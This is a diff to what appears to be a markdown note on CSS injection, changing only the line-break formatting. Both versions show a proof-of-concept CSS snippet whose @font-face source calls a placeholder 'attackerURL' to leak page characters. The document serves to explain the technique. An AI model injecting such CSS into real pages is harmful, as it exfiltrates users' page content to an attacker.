@@ -1,11 +1,11 @@
 # css-injection
-<h1>CRLF</h1>  \n
+<h1>CRLF</h1>  <br/>
 
 
->@font-face{ \n
-> font-family:poc; \n
-> src: url(attackerURL?C); \n
->} \n
->#p1{ \n
-> font-family:poc; \n
->} \n
+>@font-face{ <br/>
+> font-family:poc;  <br/>
+> src: url(attackerURL?C); <br/>
+>}  <br/>
+>#p1{  <br/>
+> font-family:poc;  <br/>
+>} <br/>
